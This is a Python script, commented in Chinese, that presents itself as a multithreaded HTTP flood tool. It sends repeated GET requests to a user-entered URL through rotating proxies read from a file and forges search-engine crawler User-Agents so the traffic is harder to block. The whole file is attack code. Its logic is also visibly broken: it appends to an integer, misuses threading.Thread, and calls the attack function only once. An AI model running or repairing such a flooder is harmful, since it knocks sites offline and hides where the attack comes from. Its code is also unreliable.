#!/usr/bin/python
# -*- coding: UTF-8 -*-
import random
import threading
import requests
import queue
import os,sys
import time

def readIPs():#读取所有的代理ip与ua
    r=open('proxiesIP.txt','r+')
    aline=r.readlines()#读取所有行
    r.close()
    return aline

#Basic
url=input('请输入url（包括协议头，即http://或https://）,使用本脚本前请确认proxiesIP.txt内有代理IP再进行使用\n')
threads=[]
threads=5
if (threads==[]):
    threads= 10
ua=[
    'Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)',
    'Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.3427.400 QQBrowser/9.6.12088.400)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider',
    'Mozilla/5.0 (compatible; EasouSpider; www.easou.com/search/spider.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0 http://www.bing.com/bingbot.htm)',
    'Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729)',
    'Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14',
    'Mozilla 0.0 SINA_WEIBO; Mozilla/5.0 (Windows; U; Windows NT 5.1; MSIE8.0; zh-CN; rv:1.9.1.8) Gecko/20100202 Firef8 (.NET CLR 3.5.30729)',
]

def que():#建立消费者消费模型
    listip=[readIPs()]
    q = queue.Queue()
    for ip in listip:
        q.put(ip)
    return ip

headers = {
        'User-Agent': random.choice(ua),
		'Accept-Encoding': 'gzip;q=0,deflate;q=0',
		'Cache-Control': 'no-cache, no-store, must-revalidate',
		'Pragma': 'no-cache',
        'Connection':'Keep-alive',
    }#定义请求头
proxies = {
        'http':'http://'+random.choice(que()),
        'https':'https://'+random.choice(que())
    }#定义更新代理ip

def pct():#定义攻击模式
    requests.get(url, proxies=proxies, headers=headers)
    proxies.update({
        'http':random.choice(que()),
        'https':random.choice(que())
    })#循环更新代理ip
    headers.update({
        'User-Agent': random.choice(ua)
    })#循环更新ua
    print(proxies)

class attack_thread(threading.Thread):#多线程
    def __init__(self,target):
        self.target=target
        self.t=threading.Thread(self.target)
        threads.append(self.t)

        
    def run(self):#开启线程
        for t in threads:
            t.start()

attack_thread(pct()).run()#程序入口

#本次更新了多线程算法，修复了因循环创建线程而引起的资源大量堵塞
